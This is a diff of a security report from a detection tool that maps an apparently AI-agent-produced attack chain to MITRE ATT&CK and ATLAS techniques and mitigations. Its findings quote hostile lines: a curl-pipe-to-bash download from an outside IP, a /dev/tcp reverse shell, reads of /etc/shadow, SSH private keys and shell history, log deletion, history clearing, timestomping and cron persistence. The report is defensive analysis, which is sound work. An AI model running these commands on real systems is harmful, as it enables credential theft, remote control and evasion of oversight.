@@ -5,7 +5,7 @@ slopmop report   <folder>
 Summary
   files       14  7 scripts, 7 outputs
   indicators  15  4 Domain, 1 Email, 7 IPv4, 3 URL
-  activities  26
+  activities  28
   tactics     11
   targeted    5   Hostnames 1, IP addresses 4
   exposed     18  Passwords and secrets 3, Usernames 6, Email addresses 1, Devices 2, IP addresses 6
@@ -14,76 +14,82 @@ Summary
 Tactics   (tactic, identifiers, files)
   [x] CommandAndControl    TA0011, AML.TA0014  20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py
   [x] CredentialAccess     TA0006, AML.TA0013  20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh
-  [x] DefenseImpairment    TA0112, AML.TA0007  20261022_092000_step05_evade.sh
+  [x] DefenseImpairment    TA0112, AML.TA0007  20261022_092000_step05_evade.sh, audit_20261022_093500.jsonl
   [x] Exfiltration         TA0010, AML.TA0010  20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py
   [x] LateralMovement      TA0008, AML.TA0015  20261022_092500_step06_stage.sh
-  [x] Persistence          TA0003, AML.TA0006  20261022_091500_step04_persist.sh
+  [x] Persistence          TA0003, AML.TA0006  20261022_091500_step04_persist.sh, audit_20261022_093500.jsonl
   [x] PrivilegeEscalation  TA0004, AML.TA0012  20261022_091000_step03_privesc.sh, 20261022_091500_step04_persist.sh
   [!] Collection           TA0009, AML.TA0009  20261022_092500_step06_stage.sh
-  [!] Execution            TA0002, AML.TA0005  20261022_091500_step04_persist.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py
+  [!] Execution            TA0002, AML.TA0005  20261022_091500_step04_persist.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py and 1 more
   [!] Stealth              TA0005, AML.TA0007  20261022_092000_step05_evade.sh
-  [i] Discovery            TA0007, AML.TA0008  20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh and 1 more
+  [i] Discovery            TA0007, AML.TA0008  20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh and 3 more
 
-Timeline   (a block for each intent, from the first of its files to be created until the last, or for each period of files that show the same tactics, with the techniques its files show)
-  [x] Discovery, CredentialAccess                                   2026-10-22T09:00:00Z to 2026-10-22T09:05:00Z
-      T1083      File and Directory Discovery
-      T1552.005  Unsecured Credentials: Cloud Instance Metadata API
-      T1007      System Service Discovery
-      T1003.008  OS Credential Dumping: /etc/passwd and /etc/shadow
-      T1552.004  Unsecured Credentials: Private Keys
-      T1552.001  Unsecured Credentials: Credentials In Files
-      T1552.003  Unsecured Credentials: Shell History
-      T1552.007  Unsecured Credentials: Container API
-      AML.T0055  Unsecured Credentials
-      AML.T0090  OS Credential Dumping
+Timeline   (a block for each intent, from the first of its files to be created until the last, or for each period of files that show the same tactics; a row is an ATT&CK technique, then its tactic and its ATLAS technique, or the tools of a tactic that no technique is named for)
+  [x] Discovery, CredentialAccess                                   2026-10-22T09:00:00Z to 2026-10-22T09:05:40Z
+      T1083      File and Directory Discovery                                    TA0007  Discovery
+      T1007      System Service Discovery                                        TA0007  Discovery
+      T1087.001  Account Discovery: Local Account                                TA0007  Discovery
+      T1087.003  Account Discovery: Email Account                                TA0007  Discovery
+      tools      id, uname, find, kubectl                                        TA0007  Discovery
+      T1552.005  Unsecured Credentials: Cloud Instance Metadata API              TA0006  CredentialAccess       AML.T0055  Unsecured Credentials
+      T1003.008  OS Credential Dumping: /etc/passwd and /etc/shadow              TA0006  CredentialAccess       AML.T0090  OS Credential Dumping
+      T1552.004  Unsecured Credentials: Private Keys                             TA0006  CredentialAccess       AML.T0055  Unsecured Credentials
+      T1552.001  Unsecured Credentials: Credentials In Files                     TA0006  CredentialAccess       AML.T0055  Unsecured Credentials
+      T1552.003  Unsecured Credentials: Shell History                            TA0006  CredentialAccess       AML.T0055  Unsecured Credentials
+      T1552.007  Unsecured Credentials: Container API                            TA0006  CredentialAccess       AML.T0055  Unsecured Credentials
 
   [x] Discovery, PrivilegeEscalation                                2026-10-22T09:10:00Z
-      T1548.003  Abuse Elevation Control Mechanism: Sudo and Sudo Caching
-      T1548.001  Abuse Elevation Control Mechanism: Setuid and Setgid
-      T1611      Escape to Host
-      AML.T0105  Escape to Host
+      tools      docker                                                          TA0007  Discovery
+      T1548.003  Abuse Elevation Control Mechanism: Sudo and Sudo Caching        TA0004  PrivilegeEscalation
+      T1548.001  Abuse Elevation Control Mechanism: Setuid and Setgid            TA0004  PrivilegeEscalation
+      T1611      Escape to Host                                                  TA0004  PrivilegeEscalation    AML.T0105  Escape to Host
 
   [x] Execution, PrivilegeEscalation, Persistence                   2026-10-22T09:15:00Z
-      T1053.003  Scheduled Task/Job: Cron
-      T1053.002  Scheduled Task/Job: At
-      T1053.006  Scheduled Task/Job: Systemd Timers
-      T1543.002  Create or Modify System Process: Systemd Service
-      T1136.001  Create Account: Local Account
-      T1098.004  Account Manipulation: SSH Authorized Keys
-      T1546.004  Event Triggered Execution: Unix Shell Configuration Modification
-      AML.T0125  Create Account
-      AML.T0142  Event Triggered Execution
+      T1053.003  Scheduled Task/Job: Cron                                        TA0002  Execution
+                                                                                 TA0003  Persistence
+      T1053.002  Scheduled Task/Job: At                                          TA0002  Execution
+                                                                                 TA0003  Persistence
+      T1053.006  Scheduled Task/Job: Systemd Timers                              TA0002  Execution
+                                                                                 TA0003  Persistence
+      T1543.002  Create or Modify System Process: Systemd Service                TA0004  PrivilegeEscalation
+                                                                                 TA0003  Persistence
+      T1136.001  Create Account: Local Account                                   TA0003  Persistence            AML.T0125  Create Account
+      T1098.004  Account Manipulation: SSH Authorized Keys                       TA0003  Persistence
+      T1546.004  Event Triggered Execution: Unix Shell Configuration Modification    TA0003  Persistence            AML.T0142  Event Triggered Execution
 
   [x] Stealth, DefenseImpairment                                    2026-10-22T09:20:00Z
-      T1685.006  Disable or Modify Tools: Clear Linux or Mac System Logs
-      T1070.003  Indicator Removal: Clear Command History
-      T1690      Prevent Command History Logging
-      T1685      Disable or Modify Tools
-      T1685.004  Disable or Modify Tools: Disable or Modify Linux Audit System Log
-      T1686      Disable or Modify System Firewall
-      T1070.006  Indicator Removal: Timestomp
-      AML.T0138  Indicator Removal
+      T1070.003  Indicator Removal: Clear Command History                        TA0005  Stealth                AML.T0138  Indicator Removal
+      T1070.006  Indicator Removal: Timestomp                                    TA0005  Stealth                AML.T0138  Indicator Removal
+      T1685.006  Disable or Modify Tools: Clear Linux or Mac System Logs         TA0112  DefenseImpairment
+      T1690      Prevent Command History Logging                                 TA0112  DefenseImpairment
+      T1685      Disable or Modify Tools                                         TA0112  DefenseImpairment
+      T1685.004  Disable or Modify Tools: Disable or Modify Linux Audit System Log    TA0112  DefenseImpairment
+      T1686      Disable or Modify System Firewall                               TA0112  DefenseImpairment
 
   [x] Discovery, LateralMovement, Execution, Collection, CommandAndControl, Exfiltration  2026-10-22T09:25:00Z to 2026-10-22T09:30:00Z
-      T1048      Exfiltration Over Alternative Protocol
-      T1560.001  Archive Collected Data: Archive via Utility
-      T1059.004  Command and Scripting Interpreter: Unix Shell
-      T1105      Ingress Tool Transfer
-      T1095      Non-Application Layer Protocol
-      AML.T0025  Exfiltration via Cyber Means
-      AML.T0072  Cyber Communication Channel
-      AML.T0050  Command and Scripting Interpreter
+      tools      find, id, uname                                                 TA0007  Discovery
+      T1021.004  Remote Services: SSH                                            TA0008  LateralMovement
+      T1059.004  Command and Scripting Interpreter: Unix Shell                   TA0002  Execution              AML.T0050  Command and Scripting Interpreter
+      T1059      Command and Scripting Interpreter                               TA0002  Execution              AML.T0050  Command and Scripting Interpreter
+      T1560.001  Archive Collected Data: Archive via Utility                     TA0009  Collection
+      T1105      Ingress Tool Transfer                                           TA0011  CommandAndControl      AML.T0072  Cyber Communication Channel
+      T1095      Non-Application Layer Protocol                                  TA0011  CommandAndControl      AML.T0072  Cyber Communication Channel
+      T1048      Exfiltration Over Alternative Protocol                          TA0010  Exfiltration           AML.T0025  Exfiltration via Cyber Means
+      tools      nc                                                              TA0010  Exfiltration
 
   [x] Execution, Persistence, DefenseImpairment                     2026-10-22T09:35:00Z
-      T1053.003  Scheduled Task/Job: Cron
-      T1053.002  Scheduled Task/Job: At
-      T1053.006  Scheduled Task/Job: Systemd Timers
-      T1136.001  Create Account: Local Account
-      T1685      Disable or Modify Tools
-      T1685.004  Disable or Modify Tools: Disable or Modify Linux Audit System Log
-      T1686      Disable or Modify System Firewall
-      AML.T0125  Create Account
-  and 6 files that show no tactic, in the saved trace
+      T1053.003  Scheduled Task/Job: Cron                                        TA0002  Execution
+                                                                                 TA0003  Persistence
+      T1053.002  Scheduled Task/Job: At                                          TA0002  Execution
+                                                                                 TA0003  Persistence
+      T1053.006  Scheduled Task/Job: Systemd Timers                              TA0002  Execution
+                                                                                 TA0003  Persistence
+      T1059.004  Command and Scripting Interpreter: Unix Shell                   TA0002  Execution              AML.T0050  Command and Scripting Interpreter
+      T1136.001  Create Account: Local Account                                   TA0003  Persistence            AML.T0125  Create Account
+      T1685      Disable or Modify Tools                                         TA0112  DefenseImpairment
+      T1685.004  Disable or Modify Tools: Disable or Modify Linux Audit System Log    TA0112  DefenseImpairment
+      T1686      Disable or Modify System Firewall                               TA0112  DefenseImpairment
+  and 4 files that show no tactic, in the saved trace
 
 Findings
   activities
@@ -109,7 +115,7 @@ Findings
         what  rm -f /var/log/auth.log (20261022_092000_step05_evade.sh:6)
     [x] PrivateKeyRead           1 line   CredentialAccess                  T1552.004, AML.T0055
         what  cat ~/.ssh/id_rsa (20261022_090500_step02_creds.sh:4)
-    [x] ReverseShell             1 line   CommandAndControl, Execution      T1059.004, T1095, AML.T0050
+    [x] ReverseShell             1 line   CommandAndControl, Execution      T1059.004, T1095, AML.T0050, AML.T0072
         what  os.system("exec 3<>/dev/tcp/$H/$PORT") (20261022_093000_step07_channel.py:8)
     [x] ScheduledJobCreation     2 lines  Execution, Persistence            T1053.003, T1053.002, T1053.006
         what  (crontab -l; echo "$JOB") | crontab - (20261022_091500_step04_persist.sh:3)
@@ -121,7 +127,7 @@ Findings
         what  chmod u+s "$F" (20261022_091000_step03_privesc.sh:4)
     [x] ShadowFileRead           1 line   CredentialAccess                  T1003.008, AML.T0090
         what  sudo cat /etc/shadow > shadow_20261022_090530.txt (20261022_090500_step02_creds.sh:6)
-    [x] ShellDownloadAndExecute  1 line   CommandAndControl, Execution      T1059.004, T1105, AML.T0072, AML.T0050
+    [x] ShellDownloadAndExecute  1 line   CommandAndControl, Execution      T1059.004, T1105, AML.T0050, AML.T0072
         what  sudo bash -c "$(curl -fsSL http://203.0.113.40/s.sh)" (20261022_092500_step06_stage.sh:4)
     [x] ShellHistoryRead         1 line   CredentialAccess                  T1552.003, AML.T0055
         what  grep -i token ~/.bash_history (20261022_090500_step02_creds.sh:5)
@@ -141,6 +147,13 @@ Findings
         what  history -c (20261022_092000_step05_evade.sh:7)
     [!] Timestomp                1 line   Stealth                           T1070.006, AML.T0138
         what  touch -r /bin/ls "$F" (20261022_092000_step05_evade.sh:8)
+    [i] EmailAccountDiscovery    1 line   Discovery                         T1087.003
+        what  SMTP_USER=alerts@corp.example (env_20261022_090540.txt:4)
+    [i] LocalAccountDiscovery    4 lines  Discovery                         T1087.001
+        what  root:x:0:0:root:/root:/bin/bash (passwd_20261022_090020.txt:1)
+              daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin (passwd_20261022_090020.txt:2)
+              deploy:x:1000:1000:Deploy:/home/deploy:/bin/bash (passwd_20261022_090020.txt:3)
+              and 1 more in the saved findings
     [i] ServiceDiscovery         1 line   Discovery                         T1007
         what  systemctl status sshd (20261022_090000_step01_recon.sh:7)
     [i] SetuidFileSearch         1 line   Discovery                         T1083
@@ -351,7 +364,7 @@ Mitigation   (MITRE ATT&CK and ATLAS, for the techniques found)
   [x] M1017 User Training                                        T1552.001
       User Training involves educating employees and contractors on recognizing, reporting, and preventing cyber threats that rely on human interaction, such as phishing, social engineering, and other manipulative techniques.
       for      CredentialFileRead
-  [x] M1018 User Account Management                              T1048, T1053.002, T1053.003, T1053.006, T1098.004, T1543.002, T1552.007, T1685, T1685.004, T1686
+  [x] M1018 User Account Management                              T1021.004, T1048, T1053.002, T1053.003, T1053.006, T1098.004, T1543.002, T1552.007, T1685, T1685.004, T1686
       User Account Management involves implementing and enforcing policies for the lifecycle of user accounts, including creation, modification, and deactivation.
       for      FileUpload, ScheduledJobCreation, SshKeyPersistence, SystemdUnitCreation, ClusterSecretRead, SecurityToolDisabling, FirewallDisabling
   [x] M1022 Restrict File and Directory Permissions              T1048, T1053.006, T1070.003, T1098.004, T1543.002, T1546.004, T1548.003, T1552.001, T1552.004, T1685, T1685.006, T1686
@@ -360,16 +373,20 @@ Mitigation   (MITRE ATT&CK and ATLAS, for the techniques found)
   [x] M1024 Restrict Registry Permissions                        T1685, T1686
       Restricting registry permissions involves configuring access control settings for sensitive registry keys and hives to ensure that only authorized users or processes can make modifications.
       for      SecurityToolDisabling, FirewallDisabling
-  [x] M1026 Privileged Account Management                        T1003.008, T1053.002, T1053.006, T1136.001, T1543.002, T1548.003, T1552.007, T1611
+  [x] M1026 Privileged Account Management                        T1003.008, T1053.002, T1053.006, T1059, T1136.001, T1543.002, T1548.003, T1552.007, T1611
       Privileged Account Management focuses on implementing policies, controls, and tools to securely manage privileged accounts (e.g., SYSTEM, root, or administrative accounts).
       exposed  username: svc
       for      ShadowFileRead, ScheduledJobCreation, AccountCreation, SystemdUnitCreation, SudoersModification, ClusterSecretRead, ContainerEscape
   [x] M1027 Password Policies                                    T1003.008, T1552.001, T1552.004
       Set and enforce secure password policies for accounts to reduce the likelihood of unauthorized access.
       for      ShadowFileRead, CredentialFileRead, PrivateKeyRead
-  [x] M1028 Operating System Configuration                       T1053.002, T1548.001, T1548.003, T1552.003, T1690
+  [x] M1028 Operating System Configuration                       T1053.002, T1087.001, T1548.001, T1548.003, T1552.003, T1690
       Operating System Configuration involves adjusting system settings and hardening the default configurations of an operating system (OS) to mitigate adversary exploitation and prevent abuse of system functionality.
-      for      ScheduledJobCreation, SetuidBit, SudoersModification, ShellHistoryRead, HistoryDisabling
+      exposed  username: app_rw
+               username: daemon
+               username: deploy
+               username: root
+      for      ScheduledJobCreation, LocalAccountDiscovery, SetuidBit, SudoersModification, ShellHistoryRead, HistoryDisabling
   [x] M1029 Remote Data Storage                                  T1070.003, T1685.006
       Remote Data Storage focuses on moving critical data, such as security logs and sensitive files, to secure, off-host locations to minimize unauthorized access, tampering, or destruction by adversaries.
       for      HistoryClearing, LogDeletion
@@ -379,11 +396,11 @@ Mitigation   (MITRE ATT&CK and ATLAS, for the techniques found)
   [x] M1031 Network Intrusion Prevention                         T1048, T1095, T1105
       Use intrusion detection signatures to block traffic at network boundaries.
       for      FileUpload, ReverseShell, ShellDownloadAndExecute
-  [x] M1032 Multi-factor Authentication                          T1136.001
+  [x] M1032 Multi-factor Authentication                          T1021.004, T1136.001
       Multi-Factor Authentication (MFA) enhances security by requiring users to provide at least two forms of verification to prove their identity before granting access.
       exposed  username: svc
       for      AccountCreation
-  [x] M1033 Limit Software Installation                          T1543.002
+  [x] M1033 Limit Software Installation                          T1059, T1543.002
       Prevent users or groups from installing unauthorized or unapproved software to reduce the risk of introducing malicious or vulnerable applications.
       for      SystemdUnitCreation
   [x] M1035 Limit Access to Resource Over Network                T1552.005, T1552.007
@@ -392,7 +409,7 @@ Mitigation   (MITRE ATT&CK and ATLAS, for the techniques found)
   [x] M1037 Filter Network Traffic                               T1048, T1095, T1105, T1552.005
       Employ network appliances and endpoint software to filter ingress, egress, and lateral network traffic.
       for      FileUpload, ReverseShell, ShellDownloadAndExecute, CloudMetadataAccess
-  [x] M1038 Execution Prevention                                 T1059.004, T1611, T1685
+  [x] M1038 Execution Prevention                                 T1059, T1059.004, T1611, T1685
       Prevent the execution of unauthorized or malicious code on systems by implementing application control, script blocking, and other execution prevention mechanisms.
       for      ShellDownloadAndExecute, ReverseShell, ContainerEscape, SecurityToolDisabling
   [x] M1039 Environment Variable Permissions                     T1070.003, T1690
@@ -401,10 +418,10 @@ Mitigation   (MITRE ATT&CK and ATLAS, for the techniques found)
   [x] M1041 Encrypt Sensitive Information                        T1552.004, T1685.006
       Protect sensitive information at rest, in transit, and during processing by using strong encryption algorithms.
       for      PrivateKeyRead, LogDeletion
-  [x] M1042 Disable or Remove Feature or Program                 T1098.004, T1552.005, T1611, T1685
+  [x] M1042 Disable or Remove Feature or Program                 T1021.004, T1059, T1098.004, T1552.005, T1611, T1685
       Disable or remove unnecessary and potentially vulnerable software, features, or services to reduce the attack surface and prevent abuse by adversaries.
       for      SshKeyPersistence, CloudMetadataAccess, ContainerEscape, SecurityToolDisabling
-  [x] M1047 Audit                                                T1053.002, T1053.003, T1095, T1552.001, T1552.004, T1560.001, T1685, T1685.004, T1686
+  [x] M1047 Audit                                                T1053.002, T1053.003, T1059, T1095, T1552.001, T1552.004, T1560.001, T1685, T1685.004, T1686
       Auditing is the process of recording activity and systematically reviewing and analyzing the activity and system configurations.
       for      ScheduledJobCreation, ReverseShell, CredentialFileRead, PrivateKeyRead, ArchiveCreation, SecurityToolDisabling, FirewallDisabling
   [x] M1048 Application Isolation and Sandboxing                 T1611
@@ -419,6 +436,14 @@ Mitigation   (MITRE ATT&CK and ATLAS, for the techniques found)
   [x] M1057 Data Loss Prevention                                 T1048
       Data Loss Prevention (DLP) involves implementing strategies and technologies to identify, categorize, monitor, and control the movement of sensitive data within an organization.
       for      FileUpload
+  [!] M1021 Restrict Web-Based Content                           T1059
+      Restricting web-based content involves enforcing policies and technologies that limit access to potentially malicious websites, unsafe downloads, and unauthorized browser behaviors.
+  [!] M1040 Behavior Prevention on Endpoint                      T1059
+      Behavior Prevention on Endpoint refers to the use of technologies and strategies to detect and block potentially malicious activities by analyzing the behavior of processes, files, API calls, and other endpoint events.
+  [!] M1045 Code Signing                                         T1059
+      Code Signing is a security process that ensures the authenticity and integrity of software by digitally signing executables, scripts, and other code artifacts.
+  [!] M1049 Antivirus/Antimalware                                T1059
+      Antivirus/Antimalware solutions utilize signatures, heuristics, and behavioral analysis to detect, block, and remediate malicious software, including viruses, trojans, ransomware, and spyware.
   [x] AML.M0005 Control Access to AI Models and Data at Rest     AML.T0025
       Establish access controls on internal model registries and limit internal access to production models.
       for      FileUpload
@@ -431,7 +456,7 @@ Mitigation   (MITRE ATT&CK and ATLAS, for the techniques found)
   [x] AML.M0043 AI Agent External Resource Lifecycle Management  AML.T0072, AML.T0125
       Organizations should control external resources created or acquired by AI agents during execution by treating those resources as attributable, lifecycle-managed assets.
       exposed  username: svc
-      for      ShellDownloadAndExecute, AccountCreation
+      for      ShellDownloadAndExecute, ReverseShell, AccountCreation
   [i] AML.M0020 Generative AI Guardrails                         AML.T0102
       Guardrails are safety controls placed between users, tools, and generative AI models to evaluate prompts, retrieved context, model outputs, and agent actions before they are accepted, executed, or shown to a user.
       for      Commands generated by an AI agent
